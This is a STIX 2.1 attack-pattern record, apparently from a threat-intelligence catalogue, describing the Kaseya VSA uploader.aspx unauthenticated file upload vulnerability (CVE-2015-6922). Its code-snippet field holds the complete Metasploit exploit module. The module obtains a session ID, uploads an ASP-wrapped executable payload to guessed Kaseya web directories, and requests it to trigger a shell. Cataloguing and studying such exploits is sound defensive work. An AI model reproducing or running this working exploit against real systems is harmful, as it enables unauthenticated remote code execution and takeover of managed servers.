{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b5d3c832-0f62-4f18-a812-3f22976a6c0e",
    "created": "2024-08-14T16:55:16.87142Z",
    "modified": "2024-08-14T16:55:16.871425Z",
    "name": "Kaseya VSA uploader.aspx Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability found in Kaseya VSA versions between 7 and 9.1. A malicious unauthenticated user can upload an ASP file to an arbitrary directory leading to arbitrary code execution with IUSR privileges. This module has been tested with Kaseya v7.0.0.17, v8.0.0.10 and v9.0.0.3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/kaseya_uploader.rb",
            "external_id": "kaseya_uploader.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-6922"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Kaseya/kaseya-vsa-vuln-2.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2015/Sep/132"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Kaseya VSA uploader.aspx Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits an arbitrary file upload vulnerability found in Kaseya VSA versions\n        between 7 and 9.1. A malicious unauthenticated user can upload an ASP file to an arbitrary\n        directory leading to arbitrary code execution with IUSR privileges. This module has been\n        tested with Kaseya v7.0.0.17, v8.0.0.10 and v9.0.0.3.\n      },\n      'Author' =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and updated MSF module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2015-6922'],\n          ['ZDI', '15-449'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Kaseya/kaseya-vsa-vuln-2.txt'],\n          ['URL', 'https://seclists.org/bugtraq/2015/Sep/132']\n        ],\n      'Platform' => 'win',\n      'Arch' => ARCH_X86,\n      'Privileged' => false,\n      'Targets' =>\n        [\n          [ 'Kaseya VSA v7 to v9.1', {} ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2015-09-23'))\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('ConfigTab','uploader.aspx')\n    })\n\n    if res && res.code == 302 && res.body && res.body.to_s =~ /mainLogon\\.asp\\?logout=([0-9]*)/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n\n  def upload_file(payload, path, filename, session_id)\n    print_status(\"Uploading payload to #{path}...\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri('ConfigTab', 'uploader.aspx'),\n      'vars_get' => {\n        'PathData' => path,\n        'qqfile' => filename\n      },\n      'data' => payload,\n      'ctype' => 'application/octet-stream',\n      'cookie' => 'sessionId=' + session_id\n    })\n\n    if res && res.code == 200 && res.body && res.body.to_s.include?('\"success\": \"true\"')\n      return true\n    else\n      return false\n    end\n  end\n\n\n  def exploit\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('ConfigTab','uploader.aspx')\n    })\n\n    if res && res.code == 302 && res.body && res.body.to_s =~ /mainLogon\\.asp\\?logout=([0-9]*)/\n      session_id = $1\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to create a valid session\")\n    end\n\n    asp_name = \"#{rand_text_alpha_lower(8)}.asp\"\n    exe = generate_payload_exe\n    payload = Msf::Util::EXE.to_exe_asp(exe).to_s\n\n    paths = [\n      # We have to guess the path, so just try the most common directories\n      'C:\\\\Kaseya\\\\WebPages\\\\',\n      'C:\\\\Program Files\\\\Kaseya\\\\WebPages\\\\',\n      'C:\\\\Program Files (x86)\\\\Kaseya\\\\WebPages\\\\',\n      'D:\\\\Kaseya\\\\WebPages\\\\',\n      'D:\\\\Program Files\\\\Kaseya\\\\WebPages\\\\',\n      'D:\\\\Program Files (x86)\\\\Kaseya\\\\WebPages\\\\',\n      'E:\\\\Kaseya\\\\WebPages\\\\',\n      'E:\\\\Program Files\\\\Kaseya\\\\WebPages\\\\',\n      'E:\\\\Program Files (x86)\\\\Kaseya\\\\WebPages\\\\',\n    ]\n\n    paths.each do |path|\n      if upload_file(payload, path, asp_name, session_id)\n        register_files_for_cleanup(path + asp_name)\n        print_status(\"Executing payload #{asp_name}\")\n\n        send_request_cgi({\n          'uri' => normalize_uri(asp_name),\n          'method' => 'GET'\n        })\n\n        # Failure. The request timed out or the server went away.\n        break if res.nil?\n        # Success! Triggered the payload, should have a shell incoming\n        break if res.code == 200\n      end\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-23",
    "x_mitre_platforms": [
        "win'"
    ]
}